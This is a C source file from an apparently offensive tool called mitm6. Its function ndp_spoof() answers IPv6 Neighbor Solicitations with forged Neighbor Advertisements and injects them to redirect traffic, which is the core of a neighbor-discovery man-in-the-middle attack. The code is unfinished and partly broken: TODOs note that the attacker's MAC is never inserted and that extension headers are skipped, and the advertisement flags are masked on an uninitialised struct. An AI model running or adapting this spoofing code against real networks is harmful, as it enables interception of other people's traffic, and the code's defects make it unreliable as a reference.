/*
 * Copyright (c) Rocco Folino
 *
 * This file is part of mitm6.
 *
 * Mitm6 is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Mitm6 is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with mitm6.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <net/ethernet.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <arpa/inet.h>

#include "mitm6.h"
#include "packet.h"

void ndp_spoof(const u_char *bytes, size_t len)
{
        struct ether_header *ether = NULL;
        struct ip6_hdr *ip = NULL;
        struct icmp6_hdr *icmp = NULL;
        struct nd_neighbor_solicit *ns = NULL;
        struct nd_neighbor_advert na;
        char sspoof[INET6_ADDRSTRLEN];
        struct packet *p = NULL;
        int cksum = 0;

        ether = (struct ether_header *)bytes;
        ip = (struct ip6_hdr *)(bytes + sizeof(struct ether_header));

        if (ip->ip6_nxt == IPPROTO_ICMPV6) {
                icmp = (struct icmp6_hdr *)(bytes + sizeof(struct ether_header) + sizeof(struct ip6_hdr));
        } else {
                /* TODO */
                warning("SKIP IP6 EXTENSION HEADERS!!! -- skipping packet");
                return;
        }
        
        if (icmp->icmp6_type == ND_NEIGHBOR_SOLICIT) {
                ns = (struct nd_neighbor_solicit *)icmp;

                bzero(sspoof, INET6_ADDRSTRLEN);
                inet_ntop(AF_INET6, &(ns->nd_ns_target), sspoof, 
                          INET6_ADDRSTRLEN);
                printf("Spoofing %s\n", sspoof);

                /* Prepare NA message */
                na.nd_na_hdr.icmp6_type = ND_NEIGHBOR_ADVERT;
                na.nd_na_hdr.icmp6_code = 0;
                na.nd_na_hdr.icmp6_cksum = 0;
                na.nd_na_hdr.icmp6_data32[0] &= 0xC0000000;
                /* na.nd_na_hdr.icmp6_data32[0] &= 0x40000000; */
                na.nd_na_target = ns->nd_ns_target;

                cksum = calculate_checksum((u_char *)&(ns->nd_ns_target), (u_char *)&(ip->ip6_src), 
                                           IPPROTO_ICMPV6, (u_char *)&na, sizeof(struct nd_neighbor_advert));

                na.nd_na_hdr.icmp6_cksum = cksum;

                /* TODO: insert my mac address!!! */
                p = packet_init();
                packet_add_ether(p, ether->ether_shost, ether->ether_shost, ETH_P_IPV6);
                packet_add_ip6(p, sizeof(struct nd_neighbor_advert), IPPROTO_ICMPV6, 64, &(ns->nd_ns_target), &(ip->ip6_src), (u_char *)&na);

                inject_packet(p->data, p->len);

                packet_free(p);
        }
}
